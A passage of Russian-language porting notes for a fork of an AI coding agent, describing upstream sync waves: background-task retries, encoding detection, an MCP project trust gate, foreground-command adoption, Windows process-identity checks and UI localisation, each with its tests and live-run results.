1:1 задача, завершившаяся пока пользователь ведёт ход, теряла бы уведомление совсем, что
обесценивает `notify_on_finish`.

`runWakeTurn` поэтому ретраит на `ErrSessionTurnBusy` с экспоненциальной задержкой (1 с, потолок
15 с) в бюджете 10 минут и немедленно сдаётся, как только пул начал drain, чтобы вечно занятая
сессия не держала горутину и `bgWG` после shutdown. Ретрай живёт в HTTP-слое, а не в
`internal/agent`: сам waker остаётся идентичным upstream, а семантика сессий — там, где ей место.
Покрыто `external/httpserver/background_wake_busy_test.go`.

### Коммит 4 — SPA, docs, этот файл

`external/ui/src/ui/tasks/*` (панель, чип, `taskStatus.ts`, `api.ts`), hash-роут
`#/s/<id>/tasks[/<taskId>]` (файл `hashRoute.ts` побайтово совпадал с upstream, патч применён
как есть), чип-тикер в `ToolCallMessage`, ~605 строк CSS.

**Расхождение — i18n.** Upstream-версия панели целиком английская. У нас весь слой переведён:
ключи `tasks.*` и `messages.toolBgTask*` в `en.ts` и `ru.ts`, `taskStatus.ts` и `api.ts` берут
строки через `t()` из `i18n/i18n.ts` (приём для не-React кода). Плюрализация чипа сделана выбором
ключа (`…One`/`…Many`), а не приклеиванием «s», потому что в русском три формы; RU использует
форму с двоеточием, корректную для любого числа.

**Расхождение — подписи кнопок разрешений.** Новая опция приходит с бэкенда как
`Always allow <grant>` — динамическая строка. Добавлен `chat/permissionOptionLabel.ts`: переводит
по стабильному `optionId`, а имя программы вытаскивает из английского префикса (тот же приём,
что в `chat/compactionSummary.ts`). Побочно чинит предсуществующий пробел форка: живые
permission-карточки рендерили `opt.name` с бэкенда, то есть `Allow`/`Allow always`/`Reject`
оставались английскими даже в RU-локали.

**CSS:** запрещённых Chromium-104 конструкций в новых 605 строках не оказалось
(`color-mix(in srgb, …)` разрешён и компилируется postcss-плагином); заменены только
`--coddy-*` переменные на `--foxxycode-*`. `npm run check:compat` зелёный.

---

### Живой прогон (реальный провайдер `neuraldeep`)

Бинарь `-tags "http ui"`, изолированные home/config вне репозитория, ключ только через
`NEURALDEEP_API_KEY`. Модели: `neuraldeep/gpt-oss-120b` и
`neuraldeep/qwen3.6-35b-a3b-noreason`. Все десять сценариев прошли.

- **Запуск и сбор результата.** `examples/httpserver/http_e2e_background.py` зелёный на
  обеих моделях (`bg_2`, `bg_3`): задача стартует, список отдаёт её, вывод читается
  на лету, статус доходит до терминального.
- **Панель.** Чип «1 фоновая задача» под последним сообщением, роут `#/s/<id>/tasks`,
  класс `shell-tasks-open`, детальная панель на `#/s/<id>/tasks/bg_1`; перезагрузка
  на диплинке восстанавливает и панель, и выбранную задачу вместе с выводом.
  Тикер в строке тулкола: «Успешно · 30s · оценка 30s · код 0». Консоль чистая.
- **Убийство дерева процессов (Windows).** Задача `ping -n 120` порождает дочерний
  процесс; `stop` снял оба (2 ping до → 1 после, оставшийся не наш), статус `stopped`.
- **Wake-on-finish.** Транскрипт вырос сам, без ввода: пришло user-сообщение
  «A background task you asked to be notified about has finished… bg_6 [succeeded]».
- **Ретрай на `session_busy`** (форковое расхождение) — воспроизведён на живом стенде:
  задача завершилась в середине пользовательского хода, в логе шесть попыток
  `background_wake_busy_retry` с задержками 1s/2s/4s/8s/15s/15s, затем
  `background_wake_finish`. Без ретрая уведомление было бы потеряно на первой же ошибке.
- **Осиротевшие задачи и `reap`** (проверка Windows-фикса). Бинарь убит с живой задачей;
  дерево (`powershell` + `PING.EXE`) пережило смерть процесса. После рестарта задача
  показана как `orphaned`, `background_reap` снёс дерево целиком («both gone»),
  повторный `reap` вернул «No leftover background processes from an earlier run» —
  то есть проба живости не таскиллит уже мёртвый (возможно переиспользованный) pid.
- **Лимиты и таймаут.** При `max_concurrent: 5` стартовали ровно 5 задач, шестая
  отбита: `background task pool is full for this session (limit 5)`.
  `timeout_seconds: 5` против `Start-Sleep -Seconds 60` дал статус `timed_out`.
- **`tools.background.enabled: false`.** Инструменты исчезают из определений
  (модель отвечает «NONE AVAILABLE»), `background: true` отбивается внятным
  «background tasks are disabled (tools.background.enabled is false)».
- **Права.** Для `Start-Sleep …; Write-Output …` (метасимволы) четвёртая кнопка
  **не** предлагается — верно. Для `git status` карточка даёт четыре кнопки, включая
  локализованную «Всегда разрешать git status». После неё `git status --short`
  выполняется без запроса, а `git status --short | Select-String foo` спрашивает снова
  и уже без программной опции — грант не расширяется на конвейер.
- **Режимы.** В `plan` и в `ask` модель видит ровно четыре наблюдающих инструмента
  и сообщает, что `background_reap` недоступен.

**Найдено и починено по итогам прогона:** upstream-овские `http_e2e_background.py` и
`acp_e2e_background.py` зашивают POSIX-цикл `for i in 1 2 3 …`, который PowerShell не
принимает, поэтому на Windows задача падала с `exit 1` раньше, чем харнесс успевал
что-либо проверить. Команда теперь собирается по `platform.system()` — тот же приём,
что у `bddSleepCommand` в Go-харнессах (коммит `a06d55f`).

**Мелочь, оставленная намеренно:** `formatDuration` отдаёт `30s` / `1m35s` и в русской
локали. Это тот же компактный словарь, что печатает бэкенд в выводе инструментов, и он
намеренно не переводится — как префиксы в `chat/compactionSummary.ts`.

---

## Волна `5e44bdb -> 0f2dbf1` (теги `0.9.52`–`0.9.53`) — ГОТОВО

8 не-merge коммитов (2026-08-02…03), портированы четырьмя коммитами на ветке
`claude/coddy-agent-upstream-sync-39e153`.

### Коммит 1 — кодировки: `internal/textenc` + вложения + сведение слоя `fs` (upstream `d5e6f82` + `60ac02b`)

Вложение `@файл` падало с «file is not valid UTF-8 text» на любом не-UTF-8 файле — то есть
на `.txt` из Блокнота на русской Windows. `ReadWorkspaceUTF8` читала сырые байты и только
проверяла `utf8.Valid`, шага декодирования не было вовсе.

Новый `internal/textenc` разрешает кодировку по ступеням: BOM (UTF-8/16/32) → быстрый путь
UTF-8 (+ `looksLikeUTF16`) → бинарный гард → chardet **в два прохода** (весь вход, затем
только строки с не-ASCII, чтобы исходник с русскими комментариями не уехал в ISO-8859-1) →
системная ANSI-кодовая страница (`platform.DecodeANSI`, только Windows) → `ErrUndecodable`.
Недекодируемое по-прежнему отбивается, но через сентинел `ErrNotDecodableText`: явное
вложение даёт HTTP 400, а `@токен`, вытащенный эвристикой из прозы, остаётся текстом и не
роняет весь ход.

**Расхождения с upstream (осознанные):**
- **`internal/tools/fs` больше не держит свой декодер.** `decodeText` делегирует в `textenc`
  и добавляет **одну** последнюю ступень — `windows-1251` — для байтов, которые никто не смог
  назвать. Ровно это форковый слой делал безусловно; явная ступень (вместо опоры на ANSI-страницу)
  делает поведение `read`/`grep`/`write` одинаковым и на Linux-CI, где `DecodeANSI` промахивается.
  Ступень локальна для `fs`: вложение, дошедшее до неё, было бы шумом в промпте, поэтому путь
  вложений по-прежнему отказывает.
- **Round-trip API** (`Decode`, `Encoding.Encode`, `DecodeAs`), которого upstream не нужен:
  `write`/`edit`/`apply_patch` обязаны вернуть файл побайтово, вместе с меткой BOM. Рун,
  непредставимый в целевой кодировке, — ошибка, а не тихая подстановка.
- **`search.go`** определял бинарность голым сканом NUL и потому пропускал UTF-16 целиком.
  Теперь спрашивает `textenc.LooksBinary`, иначе `grep` был бы единственным тулом, не видящим
  файл, который `read` читает нормально. Системный `rg` по-прежнему не отвечает ASCII-паттерном
  по UTF-16 (там ASCII не однобайтовый) — такие файлы идут встроенным движком; записано в
  `docs/architecture.md`.
- `read` на бинарном файле теперь возвращает внятную ошибку вместо cp1251-мусора.

**Тесты:** `features/prompt_attachment_encoding.feature` (сценарии upstream плюс UTF-16,
UTF-8-BOM, `@бинарник` в прозе и отбитое явное вложение бинарника) и
`internal/tools/fs/encoding_matrix_test.go` — 8 кодировок против `read`, постраничного
`read`, обеих веток `grep`, `write`, `edit`, `apply_patch` и diff-превью, с проверкой
**байтов на диске**, а не декодированной строки. Девять предсуществующих cp1251-тестов
прошли **без единой правки**.

**Проверено «наоборот»:** откат `ReadWorkspaceUTF8` роняет фичу; отключение общего декодера
роняет 41 подтест матрицы.

### Коммит 2 — MCP project trust (upstream `d00bcd7`)

**Закрывает риск, который форк сам себе записал** волной `96c04fb → 6d46afe`:
«Project-local `.foxxycode/mcp.json` исполняется без гейта доверия».

`internal/mcp/trust.go` (SHA-256 по transport/command/args/env/url/headers, `TrustStore` в
`<home>/mcp-trust.json` по канонизированной рабочей папке) + `gate.go` (`TrustGate` перепроверяет
решение непосредственно перед открытием транспорта). Политика `mcp.project_trust: ask|allow|deny`,
флаг `--mcp-project-trust` в обоих входах, CLI `foxxycode mcp list|trust|untrust`, роуты
`POST /foxxycode/mcp/{name}/trust|untrust` и `POST /foxxycode/mcp/project-trust`, щит в
«Настройки → Серверы MCP».

**Расхождения с upstream (осознанные):**
- **Hand-port в форковую схему клиентов.** Форк делит MCP-клиентов надвое: `configuredMCPClients`
  (из конфигурации) и `MCPClients` (переданные ACP-клиентом). Гейт стоит в `configuredMCPClients`,
  который перестраивается **и** при старте сессии, **и** при живой смене рабочей папки (`cwd.go`),
  так что покрыты оба входа — у upstream смены папки нет вовсе. Клиентские серверы намеренно
  не гейтятся: они приходят от редактора оператора, а не из чекаута.
- Форковое дедуплицированное предупреждение «failed to load mcp.json» переехало в
  `mcp.ListManagedServersTolerant`, а не потерялось: один битый файл по-прежнему логируется
  один раз, а не на каждом ходу.
- **Весь UI-слой локализован** (upstream — только английский): 33 ключа `settings.mcp.*` в
  `en.ts` и `ru.ts`, при этом `PROJECT_TRUST_OPTIONS` и `declarationFacts` возвращают
  **i18n-ключи**, а не готовый текст — та же конвенция, что уже была у `MCPValidationKey`.
- **`mcp` скрыт из формы настроек** (`uiHiddenConfigKeys` рядом с `httpserver`): политика
  редактируется во вкладке MCP, рядом с серверами, которыми управляет, и не попадает в
  «Сохранить всё». Поэтому фикстура `ui-schema.json` и `schema.ru.ts` правок не потребовали.

**Два форковых теста упали** — их предмет как раз project-local серверы, ставшие гейчеными.
Оба не «ослаблены», а дополнены одобрением, которое сделал бы оператор:
`TestMCPManagementUsesCurrentProjectWorkspace` теперь отдельно проверяет, что неодобренная
запись **не пробится** (tools пуст) и что одобрение в одной папке не переносится на другую;
`TestSetSessionWorkspaceReconnectsProjectMCPAndPreservesClientServers` одобряет обе декларации.

**Тесты:** `features/mcp_project_trust.feature` — четыре `@acp`-сценария upstream и один
`@http`, плюс **три форковых**: смена рабочей папки применяет гейт заново, переход в уже
одобренную папку поднимает её сервер, ACP-поставляемый сервер не гейтится. Юниты на
fingerprint/store/конфиг/флаг, три HTTP-роута и 14 тестов `MCPSection`, включая тест,
фиксирующий, что новый слой читается по-русски.

**Проверено «наоборот»:** с гейтом, закороченным на `allowed`, падают три `@acp`-сценария и
`@http`.

**Живой прогон CLI:** неодобренная запись в списке как `NEEDS APPROVAL` с командой, которую
запустила бы; одобрение печатает объявление с **именами** переменных окружения и без значений,
в `mcp-trust.json` секрета нет; правка команды снимает одобрение, а переключение `disabledTools`
— нет; `deny` отказывает и в старте, и в одобрении; неверное значение флага завершается кодом 1.

### Коммит 3 — усыновление foreground-команды (upstream `02877db` + `400fee7` + `6f8d7bb`)

Foreground `run_command` с `npm run serve` вешал ход навсегда: на дедлайне
`exec.CommandContext` убивал только шелл, а внуки-ноды держали пишущий конец пайпа, который
exec заводит для не-`*os.File` stdout, поэтому `io.Copy` внутри `cmd.Wait` никогда не видел EOF.
Убивать такую команду в любом случае неверно — дев-сервер делает ровно то, о чём просили.
Теперь она передаётся пулу фоновых задач: процесс живёт в своей группе, поток вывода
перенаправляется в sink задачи с доливкой всего захваченного ранее, а тул отвечает id задачи
и этим выводом.

- `internal/tools/shell/foreground.go` — `exec.Command` без ctx, отсоединённая группа
  процессов, единственный `cmd.Wait` и `cmd.WaitDelay` как страховка от внука с пайпом.
- `internal/tools/shell/switchwriter.go` — `exec.Cmd` фиксирует `Stdout` на `Start`, поэтому
  вывод всегда пишется сюда, а усыновление переводит цель на sink задачи.
- `internal/bgtask` — `Pool.Adopt` делит единственный путь планирования со `Start`;
  усыновлённая работа получает `max_timeout_seconds` (никогда не только что истёкший foreground-лимит,
  который убил бы её мгновенно) и сохраняет исходный `StartedAt`.
- Результат таймаута — `(string, nil)`, а не ошибка: агентный цикл выбрасывает строку
  результата при ошибке тула, именно это и теряло вывод.
- `platform.SanitizeOutput` — снятие ANSI и схлопывание `\r`-перерисовок при **чтении**
  вывода; `output.log` остаётся сырым.
- `internal/tools/ssh/exec.go` — та же потеря вывода на таймауте, чинится так же;
  sink под мьютексом, потому что чтение стало конкурентным.

**Расхождения с upstream (осознанные):**
- Форковый `shellDescription` сохраняет свои PowerShell-абзацы (here-string, бэктик, отсутствие
  heredoc); заменён только хвост про «2>&1 не нужен». `run_test.go` фиксирует подстроки описаний,
  поэтому обновлён вместе с текстом.
- `sleepCommand` в `bdd_background_test.go` был методом; вынесен в пакетную функцию (как у
  upstream), потому что харнесс усыновления берёт те же формы.
- **`platform.DecodeOutput` в SSH-путь намеренно не добавлена**, вопреки первоначальному плану:
  она снимает **локальную** консольную кодовую страницу Windows, а байты приходят с удалённого
  хоста — применять её там было бы неверно. `SanitizeOutput` (ANSI и `\r`) уместна и добавлена.
- Форковый `ProcessGroupAlive` на Windows (`OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION)` +
  `GetExitCodeProcess`) не тронут. ⚠️ **Снято в волне `0f2dbf1 → fa7ecf1`** — принята
  upstream-реализация с проверкой идентичности процесса.

**Тесты:** `features/foreground_timeout_adoption.feature` (6 сценариев, включая внука,
держащего пайп) + 14 юнитов и `internal/bgtask/adopt_test.go`, `switchwriter_test.go`,
`internal/platform/ansi_test.go`. Всё прогнано на Windows/PowerShell.

**Проверено «наоборот»:** с возвращённой веткой «убить и вернуть ошибку» падают 5 из 6
сценариев. Оговорка: это доказывает усыновление, но **не** исходное вечное зависание — оно
жило в связке `exec.CommandContext` + `cmd.Run`, которой в новом коде уже нет.

### Коммит 4 — хозяйственное (upstream `bbba482` + `5f05257`) + этот файл

- `docker-compose.dev.yml`: монтирование конфига переехало в `<home>/config.yaml`.
  **Сверх upstream** приведена в соответствие переменная `FOXXYCODE_CONFIG` — upstream
  оставил свою `CODDY_CONFIG` указывающей на прежний `~/.coddy.yaml`, куда после его же
  правки ничего не монтируется. `config.Resolve` берёт дефолт как `<home>/config.yaml`,
  поэтому верное значение — `/home/user/.foxxycode/config.yaml`.
- `.codex/hooks.json` + `.codex/hooks/attach_rules.py`: на `SessionStart` инжектит правила с
  `alwaysApply: true`, на `PreToolUse` — те, чьи `globs` покрывают патч; сам парсит
  frontmatter `.mdc`, шлёт каждое правило не более раза за сессию и **fails open**.
  Проверено на этом репозитории вручную обоими событиями.
- **Секция `AGENTS.md` про `.codex/` переписана.** Она запрещала копировать правила в `.codex/`;
  хук ничего не копирует — он читает `.cursor/rules/` в рантайме, — так что формулировка теперь
  описывает механизм, а не запрещает его, и явно фиксирует, что источник правды не меняется.
- Новая секция `AGENTS.md` **Code Review Rules**: дрейф `openapi.go`, протечка build-тегов,
  чтение project-local конфига мимо `TrustGate`, незапересобранные `go:embed`-ассеты, плюс
  **форковый пятый пункт** — не заводить второй декодер кодировок мимо `internal/textenc`.

### Живой прогон (реальный провайдер `neuraldeep`)

Бинарь `-tags "http ui"`, изолированные `FOXXYCODE_HOME`/`FOXXYCODE_CONFIG`/`FOXXYCODE_CWD`
вне репозитория, ключ только через `NEURALDEEP_API_KEY`. Модели `neuraldeep/gpt-oss-120b`
и `neuraldeep/qwen3.6-35b-a3b-noreason`.

**Оговорка по методике.** Первые прогоны шли с промптом в аргументе `curl -d "…"`, и
кириллица приходила на сервер как 108 символов U+FFFD: её ломает Windows-слой запуска
процесса, а не продукт. Поймано по persisted user-сообщению в `messages.json`. Проверки
переделаны через `--data-binary @файл` (тело пишет Python в UTF-8); только эти результаты
ниже и засчитаны. Вложения были достоверны с самого начала — их текст идёт из файла, а не
из командной строки.

- **Вложения.** cp1251-заметка процитирована моделью дословно, вместе с `«кавычки»`,
  `тире —`, `№ 5`, `ёж и Ёлка`. UTF-16 с BOM расшифрован, метка в текст не попала.
  Явное вложение PNG → **HTTP 400** с `ErrNotDecodableText`; `@logo.png` в прозе ход не роняет
  (200).
- **Правка cp1251-файла моделью.** `edit` с `newString = «итог» — № 42, ёж`: строка записана,
  файл на диске **остался cp1251** (не является валидным UTF-8), остальные строки и все
  спецсимволы целы.
- **Усыновление.** `Write-Output …; Start-Sleep -Seconds 90` с `timeout_seconds: 3`: ход
  вернулся за ~10 с (а не за 90), задача `bg_1` в пуле со статусом `running`,
  `timeout_seconds: 3600` — то есть `max_timeout_seconds`, а не истёкшие 3 с; `started_at`
  указывает на foreground-старт. Уведомление содержит id задачи, «NOT cancelled», запрет
  на вторую копию и захваченный вывод, причём **уведомление стоит перед выводом**. Модель
  вызвала `run_command` **ровно один раз**. `stop` перевёл задачу в `stopped`.
- **MCP-гейт.** До одобрения: `needs_approval`, тулы пусты, команда репозитория **не
  выполнялась** (маркер-файл отсутствует), в логе `state`, `digest` и
  `approve_with="foxxycode mcp trust repo-supplied"`. После `POST /foxxycode/mcp/{name}/trust`
  сервер пробится и маркер появляется — то есть команда запускается только по нашему решению.
  В `mcp-trust.json` ноль вхождений значения секрета, в квитанции `env_keys: ["SECRET_TOKEN"]`.
  `untrust` возвращает `needs_approval`.

### Осталось нерешённым

- **Известные риски волны `96c04fb → 6d46afe`** — закрыт только первый (project-local MCP).
  Остальные четыре (пропавший из настроек редактор `mcp_servers`, включённые по умолчанию
  result eviction и `tools.output_limits`, незакрываемый канал `streamableHTTPTransport`,
  инвалидация prompt cache проекцией eviction) в силе.
- Четыре PNG `docs/assets/screenshot-tool-previews*.png` — тянутся с волны `6666606 → 19754e8`.

---

## Волна `0f2dbf1 -> fa7ecf1` (теги `0.9.54`–`0.9.60`) — ГОТОВО

19 не-merge коммитов (2026-08-01…08), 88 файлов, +5071/−259. Шесть независимых блоков.
Решения оператора для этой волны: брать её **целиком 1:1** (включая `.opencode/`, `.zcode/`
и 10 PNG), `ProcessGroupAlive` — **принять upstream полностью**, hot-reload MCP — **синхронный**,
как у upstream.

### 1. Ретраи LLM принадлежат нам (upstream `8bfe843` + `6535cfc`)

Скрытые ретраи SDK перемножались с нашими: при `retry_max: 1` провайдер слал до **6** запросов
вместо 2. `option.WithMaxRetries(0)` в `newOpenAIProvider`, `newAnthropicProvider` и в per-request
`opts` у `codexProvider.responsesClient` — три однострочника, легли чисто.

**Расхождение:** `internal/llm/resilient_test.go` — таблица upstream взята (она добавляет
`context.DeadlineExceeded`), но форковый кейс «`net.Error.Timeout()` retryable» **дописан**, а не
затёрт. `resilient.go` upstream не трогает, форковый `Logger` остаётся.

**Тесты:** `features/llm_retry_ownership.feature` (6 строк примеров) + `bdd_retry_ownership_test.go`
(httptest-сервер, всегда 500, считает запросы). **Проверено «наоборот»:** с откатом однострочников
падают ровно 4 сценария из 6 с «upstream requests = 6, want 2».

### 2. Системная кодовая страница перевешивает детектор (upstream `38bb9a4`)

Короткий файл, где кириллица — меньшинство (исходник с одним русским комментарием, повседневный
случай на русской Windows), уводил chardet в ISO-8859-1 **как «успех»**, поэтому до форковой
ступени `windows-1251` дело не доходило вовсе. Теперь ANSI-чтение — кандидат, который может
перебить детектор, по трём условиям: ANSI заявляет нелатинское письмо, которого детектор не нашёл;
у детектора есть непрерывный прогон не-ASCII ≥ 3 (форма мохибаке); ни одно слово в ANSI-чтении не
смешивает письменности.

**Ручной порт, не cherry-pick:** у форка `textenc` переписан под round-trip, поэтому арбитраж
вшит в **`Decode(data) (string, Encoding, error)`**, а не в обёртку `DecodeToUTF8`, куда бьёт хунк
upstream; `candidate` — `{text, enc}`, а не `{text, charset}`; `hasNonLatinLetters` уже был.
Чистые функции (`preferSystemANSI`, `maxNonASCIIRun`, `hasMixedScriptWord`, `minMojibakeRun`)
перенесены дословно. Комментарий в `internal/platform/output_windows.go` правлен вручную (форк там
сильно разошёлся).

**Взаимодействие с форковой ступенью cp1251:** она строго внешняя (`internal/tools/fs/text_encoding.go`,
срабатывает только на `ErrUndecodable`), поэтому на русской Windows ответ теперь даёт уже `Decode`
с тем же charset `windows-1251` — round-trip не меняется; на Linux-CI `DecodeANSI` — заглушка,
ветка инертна. В комментарий `text_encoding.go` дописано, что cp1251 теперь **третий**, а не второй
кириллический путь.

**Тесты:** `prefer_ansi_test.go` (портируемая таблица), `textenc_windows_test.go`, `@windows`-сценарий
в `features/prompt_attachment_encoding.feature` + гейтинг `systemANSIReadsCyrillic()` / `~@windows`.
**Проверено «наоборот»** на этой машине (ACP 1251): с закороченным `preferSystemANSI` падает ровно
новый сценарий, остальные 8 зелёные.

### 3. Идентичность Windows-процессов (upstream `caee16a` + `23953c9` + `9262ffe`, одним коммитом)

Три коммита — три черновика одного дизайна; промежуточные состояния (slack-окно, fail-open
идентичность, 2-арг terminate) строго хуже и не воспроизводились.

**Форковое расхождение снято по решению оператора.** `internal/platform/procgroup_windows.go` взят
у upstream целиком: `ProcessGroupAlive(pid, startedAt)` открывает
`PROCESS_QUERY_LIMITED_INFORMATION|SYNCHRONIZE`, отличает труп от живого через
`WaitForSingleObject(h,0) == WAIT_TIMEOUT` и требует **точного совпадения creation time**;
fail-closed и на ошибке открытия, и на нулевом `startedAt`. Обоснование: тот же булев ответ теперь
авторизует `taskkill /T /F`, а идентичность недоказуема на хэндле, который не удалось открыть.
Форковая константа `stillActive` и тест `TestProcessGroupAliveReportsProtectedProcess` (пинил
`ProcessGroupAlive(4) == true`) удалены вместе с политикой, которую пинили.

Плюс: `ProcessStartedAt`, `Snapshot.ProcessStartedAt` с тегом **`json:"-"`** (в HTTP-строку задачи
не попадает, поэтому OpenAPI править не пришлось), `persistedSnapshot` с ключом
`process_started_at` в `meta.json`, метод `ProcessStartedAt()` в интерфейсе `Handle` и
3-арг `TerminateProcessGroupByPID`, который переоткрывает pid, перепроверяет идентичность и держит
хэндл **всё время `taskkill`**.

**Форк-специфика:** третья реализация `Handle` — `adoptedHandle` в `internal/tools/shell/foreground.go`
(путь усыновления `Pool.Adopt`, которого у upstream в этом виде нет) получает `processStartedAt`,
иначе усыновлённая задача становится нереапабельной. `startDetachedHelper` в `bgtask_test.go`
переписан на `NewCommandRunner()` — на голой Windows `sleep` нет; это предпосылка Windows-CI (блок 6).

**Одноразовое изменение поведения (проговорено в `docs/background-tasks.md`, раздел Upgrading):**
бандл, записанный до этой волны, имеет `pid`, но не `process_started_at`. На Windows такая запись
больше не попадает в `background_list`, не убивается `background_reap` и молча игнорируется
`background_stop`. Escape-hatch намеренно не делали — он вернул бы дыру переиспользования pid.
Unix не затронут: его проба идентичность не потребляет.

**Тесты:** `internal/platform/procgroup_test.go` (кроссплатформенный) и upstream'ский
`procgroup_windows_test.go` — 9 тестов, включая `TestProcessGroupAliveFailsClosedWithoutAStartTime`
и `TestTerminateProcessGroupByPIDRefusesAPidTheRecordDoesNotDescribe`; `features/background_reap.feature`
+ `bdd_background_reap_test.go` (3 сценария, реальный второй пул поверх того же бандла);
`examples/httpserver/http_e2e_background_reap.py` (уже platform-aware у upstream — форковой правки
про POSIX-цикл не потребовалось).

### 4. ACP session-ready + `currentModeId` (upstream `2e0e915`, не-MCP половина)

`available_commands_update` уходил **до** ответа на `session/new`, то есть клиент получал команды
для сессии, идентификатор которой ещё не знал. Добавлен интерфейс `sessionReadyHandler` и
`Manager.HandleSessionReady`; вызовы `sendAvailableSlashCommands` убраны из `HandleSessionNew` и
`loadSessionFromDisk`. Плюс проводной фикс `ModeUpdate.ModeID` → `CurrentModeID` /
`json:"currentModeId"` (три вызова; `SessionSetModeParams.ModeID` — другая структура, не тронута;
`bridge.go` `ModeUpdate` не маппит, SPA не затронута — меняется формат для ACP-клиентов).

**Расхождения:** третий вызов `sendAvailableSlashCommands` — `cwd.go:98` в `SetSessionWorkspace` —
**оставлен на месте**: смена рабочей папки не отвечает ни на какой запрос. Хунки, которые в форке
уже были (`TryLock` в `acquireStubTurnLock`, введение `replaceConfiguredMCPClients`, смена сигнатуры
`connectMCPServer`), пропущены.

### 5. `deferPublish` (upstream `22a983b`) — единственное место, где «1:1» физически неприменимо

Реплей транскрипта паркуется в `state.pendingReadyNotify` и публикуется из `HandleSessionReady`.

**Вынужденная форковая правка.** У форка есть слой `internal/session/manager_load_flight.go`,
которого у upstream нет: через него HTTP-маршруты гонят `HandleSessionNew`/`HandleSessionLoad`, и
там `HandleSessionReady` не выстрелит никогда — дословный порт оставил бы навсегда припаркованное
замыкание с целым транскриптом. Поэтому `loadOrCreateSession` **сама** зовёт `m.HandleSessionReady(id)`
в обеих ветках. Это же сохраняет доставку `available_commands_update` для HTTP-созданных сессий
после переезда слэш-команд из блока 4. Подстраховка: `State.CloseAll` дренирует и выбрасывает
припаркованное замыкание.

Гард `m.server != nil` **не использован**: в форке HTTP-сервер тоже передаёт непустой sender
(`external/httpserver/commands.go`), так что этот признак ничего не различает — защищает именно дренаж.

**Тест (форковый):** `TestHTTPLoadPublishesTheReplayInsteadOfParkingIt` + тест-шов
`export_ready_notify_test.go`. **Проверено «наоборот»:** без дренажа тест падает на «0 available-commands
updates».

### 6. Живая перезагрузка MCP (upstream `2e0e915` MCP-половина + `8ffa6ca` + `3503593`)

Синхронно, как у upstream. `ReplaceConfig` сравнивает только `MCPServers` и при изменении зовёт
`reloadConfiguredMCPServers(ctx)` с бюджетом `mcpReloadTimeout = 30s`. Сессия с идущим ходом не
трогается: флаг `mcpReloadPending` ставится **до** пробы блокировки, а свап делается, когда ход
отпустит замок (`drainPendingMCPReload`). Дозвон, который не уложился в ctx, **выбрасывается**
(`applyConfiguredMCPReload`), а не устанавливается: пустой результат ничего не говорит о конфигурации
оператора и снял бы у здоровой сессии её инструменты.

**Расхождения:**
- Дозвон идёт через **форковый `m.configuredMCPClients(ctx, cwd)`** — параллельный и с
  `mcp.NewTrustGate` внутри, так что гейт доверия остаётся на единственной двери, а перезагрузка
  является **свежей оценкой доверия**, а не повтором того, с чем сессия стартовала.
- **Оборачиваются три acquirer'а, а не два.** Кроме `AcquireComposerTurnLock` и
  `HandleSessionPromptWithSender` есть форковый **`AcquireComposerTurnLockWaiting`** — именно им
  пользуется стримящий композер SPA (потом передаёт ход с `SkipTurnLock`), поэтому без обёртки
  основной HTTP-путь не дренировал бы **никогда**.
- `SetSessionWorkspace` намеренно берёт сырой замок: она только что сама передозвонилась под новый
  cwd, дренаж повторил бы ту же работу.
- Из `e43f3ea` понадобился **один хунк** — guard `mcpClosed` в `addMCPClient`.
  `replaceConfiguredMCPClients` и `CloseAll`→`markMCPClosed` у форка уже были (записано, чтобы
  следующая волна не искала).
- `manager_mcp_reload_test.go`: в хелпер добавлено ожидание `WaitMCPReady` — форк дозванивается
  на фоне, у upstream дозвон инлайновый, поэтому клиентов после `HandleSessionNew` ещё нет.
  По той же причине из `bdd_acp_session_test.go` удалён дубликат `assertMCPClientNames`:
  форковый в `manager_test.go` строго сильнее (ждёт гейт готовности).

**Тесты:** `features/acp_session_integration.feature` (4 сценария, все зелёные),
`internal/session/manager_mcp_reload_test.go`, `external/httpserver/mcp_config_http_test.go`, плюс
**форковый** `TestReplaceConfigDrainsThroughTheWaitingComposerLock` — acquirer, которого у upstream
нет. **Проверено «наоборот»** трижды: без выброса ctx-просроченного дозвона падает
`TestReloadKeepsClientsWhenContextExpired`; без дренажа на релизе замка падает
`TestReplaceConfigDefersMCPReloadWhileTurnHoldsLock`; без обёртки на `AcquireComposerTurnLockWaiting`
падает форковый тест.

### 7. ConfirmDialog (upstream `814701f` + `bb90e09` + `df305ba`, одним коммитом)

`814701f` в одиночку не собирается (удаляет `sessionDeleteBackdropSuppress`, не разведя `App.tsx`),
`df305ba` удаляет два CSS-правила из `bb90e09` — взята итоговая форма каждого файла. Нативный
`confirm()` заменён React-диалогом в трёх местах: удаление черновика, удаление чата
(`App.tsx`), удаление задания планировщика (`SchedulerJobEditorSheet.tsx`).
`sessionDeleteBackdropSuppress.{ts,test.ts}` удалены — их подпорка больше не нужна.

**Расхождения:**
- **i18n (upstream — целиком английский).** Три английских дефолта (`"Cancel"`, `"Confirm"`,
  `"Confirm action"`) не видны линту `noHardcodedStrings` (это JS-дефолты, а не JSX-текст), но
  уехали бы в прод непереведёнными — заменены на `confirm.cancel` / `confirm.confirm` /
  `confirm.ariaLabel` через не-хуковый `translate` (конвенция форка для дефолтов). Плюс новые
  `app.confirmDeleteDraftBody`, `app.confirmDeleteChatBody`, `app.delete`,
  `scheduler.confirmDeleteBody`; существующие `app.confirmDelete*` переформулированы в вопрос.
  Все ключи — и в `en.ts`, и в `ru.ts` (гейт `messagesParity`).
- **`ConfirmProvider` смонтирован внутри `I18nProvider`** (у форка дерево
  `StrictMode → AppErrorBoundary → I18nProvider → App`, хунк upstream ждёт `App` прямо под
  `StrictMode`), чтобы подписи резолвились в активной локали, а падение диалога ловил
  `AppErrorBoundary`.
- **`df305ba` для форка обязателен, а не косметика:** у форка есть свой window-listener на Escape
  (`App.tsx`), закрывающий планировщик и шторку сессий; без capture-фазы и `stopImmediatePropagation`
  отмена подтверждения схлопывала бы ещё и шторку.
- **CSS:** ~162 строки вставлены перед `.workspace-menu`; `--coddy-*` → `--foxxycode-*`
  (в форке 0 вхождений `--coddy-`, а `postcss-resolve-color-mix.mjs` жёстко валит сборку на
  нерезолвящейся custom property). Запрещённых Chromium-104 конструкций нет; `check:compat` зелёный.

**Гейты:** 974 vitest-теста (165 файлов), `build` + `check:compat` + `build:go` (ассеты `go:embed`
пересобраны), `go test -tags=http,ui ./external/httpserver`.

### 8. Хуки правил OpenCode и ZCode (upstream `03aacf1` + `122d50d`)

Обоих каталогов в форке не было (только `.codex/`). Портированы как есть:
`.opencode/{package.json,lib,plugins,tests}`, `.zcode/{config.json,hooks/attach_rules.py}`,
